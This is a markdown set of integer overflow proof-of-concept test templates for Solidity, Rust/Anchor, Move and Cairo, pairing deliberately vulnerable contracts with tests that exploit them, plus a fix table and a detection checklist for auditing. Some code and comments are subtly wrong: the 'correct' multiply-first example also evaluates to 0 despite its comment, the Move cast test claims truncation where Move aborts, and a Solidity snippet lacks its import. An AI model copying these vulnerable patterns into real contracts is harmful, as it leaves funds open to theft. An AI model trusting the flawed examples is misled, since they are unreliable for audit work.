# Integer Overflow/Underflow PoC Templates

## EVM - Solidity < 0.8.0
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0; // Vulnerable version

import "forge-std/Test.sol";

contract OverflowTest is Test {
    VulnerableToken token;
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new VulnerableToken();
        token.mint(attacker, 100);
    }

    function testUnderflow() public {
        vm.prank(attacker);
        // Transfer more than balance causes underflow
        // 100 - 101 = 2^256 - 1 (max uint256)
        token.transfer(address(0xdead), 101);
        
        // Attacker now has massive balance
        assertGt(token.balanceOf(attacker), 1e70);
    }

    function testOverflow() public {
        // Multiplication overflow
        uint256 a = type(uint256).max;
        uint256 b = 2;
        uint256 result = a * b; // Overflows to small number
        
        assertLt(result, a);
    }
}
```

## EVM - Unchecked Block (Solidity >= 0.8.0)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract UncheckedOverflowTest is Test {
    function testUncheckedOverflow() public {
        uint256 a = type(uint256).max;
        uint256 result;
        
        // Explicit unchecked block
        unchecked {
            result = a + 1; // Overflows to 0
        }
        
        assertEq(result, 0);
    }
}

// Vulnerable contract using unchecked
contract VulnerableCounter {
    uint256 public count;
    
    function increment(uint256 amount) external {
        unchecked {
            count += amount; // Can overflow
        }
    }
}
```

## EVM - Casting Overflow
```solidity
contract CastingOverflowTest is Test {
    function testDowncastOverflow() public {
        uint256 largeValue = 256;
        uint8 smallValue = uint8(largeValue); // Truncates to 0
        
        assertEq(smallValue, 0);
    }

    function testSignedCastOverflow() public {
        uint256 largeUnsigned = type(uint256).max;
        int256 signedValue = int256(largeUnsigned); // Becomes -1
        
        assertEq(signedValue, -1);
    }
}

// Vulnerable pattern
contract VulnerableCast {
    function withdraw(uint256 amount) external {
        // Dangerous: truncates large amounts
        uint128 truncated = uint128(amount);
        _transfer(truncated);
    }
}
```

## EVM - Multiplication Before Division
```solidity
contract PrecisionLossTest is Test {
    function testPrecisionLoss() public {
        uint256 amount = 1e18;
        uint256 rate = 3;
        uint256 divisor = 1e18;
        
        // Vulnerable: division first loses precision
        uint256 wrong = (amount / divisor) * rate; // = 3
        
        // Correct: multiplication first
        uint256 correct = (amount * rate) / divisor; // = 3
        
        // But with different numbers...
        amount = 1e17; // 0.1 tokens
        wrong = (amount / divisor) * rate; // = 0 (lost!)
        correct = (amount * rate) / divisor; // = 0.3 * 1e18
    }
}
```

## Solana/Rust - Integer Overflow
```rust
#[test]
fn test_rust_overflow() {
    // In release mode, Rust integers wrap on overflow
    let a: u64 = u64::MAX;
    let b: u64 = a.wrapping_add(1); // Wraps to 0
    
    assert_eq!(b, 0);
}

#[test]
#[should_panic]
fn test_checked_overflow() {
    let a: u64 = u64::MAX;
    let b = a.checked_add(1).unwrap(); // Panics
}

// Vulnerable Anchor code
pub fn vulnerable_add(ctx: Context<Add>, amount: u64) -> Result<()> {
    let account = &mut ctx.accounts.counter;
    account.value += amount; // Can overflow in release
    Ok(())
}

// Fixed
pub fn safe_add(ctx: Context<Add>, amount: u64) -> Result<()> {
    let account = &mut ctx.accounts.counter;
    account.value = account.value
        .checked_add(amount)
        .ok_or(ErrorCode::Overflow)?;
    Ok(())
}
```

## Move - Integer Overflow
```move
#[test]
#[expected_failure(arithmetic_error, location = Self)]
fun test_overflow() {
    let max: u64 = 18446744073709551615;
    let result = max + 1; // Aborts with arithmetic error
}

// Move has built-in overflow protection
// But can still have logic errors with casting

#[test]
fun test_cast_truncation() {
    let large: u128 = 256;
    let small: u8 = (large as u8); // Truncates to 0
    assert!(small == 0, 0);
}
```

## Cairo - Felt Overflow
```cairo
// Cairo uses felts (field elements) which wrap around
// prime = 2^251 + 17 * 2^192 + 1

#[test]
fn test_felt_overflow() {
    let max_felt = 0x800000000000011000000000000000000000000000000000000000000000000;
    let result = max_felt + 1; // Wraps to 0
    assert(result == 0, 'Should wrap');
}

// Use bounded integers for safety
use core::integer::BoundedInt;

fn safe_add(a: u256, b: u256) -> u256 {
    let max = BoundedInt::max();
    assert(a <= max - b, 'Overflow');
    a + b
}
```

## Common Vulnerable Patterns

| Pattern | Risk | Fix |
|---------|------|-----|
| Solidity < 0.8.0 | Silent overflow | Upgrade or SafeMath |
| `unchecked` blocks | Intentional wrap | Validate inputs |
| Downcasting | Truncation | Check bounds first |
| Division before multiply | Precision loss | Multiply first |
| Rust release mode | Silent wrap | Use `checked_*` |
| Felt arithmetic | Field wrap | Use bounded integers |

## Detection Checklist
- [ ] Solidity version < 0.8.0
- [ ] `unchecked` blocks without validation
- [ ] Type casting without bounds check
- [ ] Division before multiplication
- [ ] Missing `checked_*` in Rust
- [ ] Felt arithmetic in Cairo
- [ ] Token amount calculations
- [ ] Fee/reward calculations
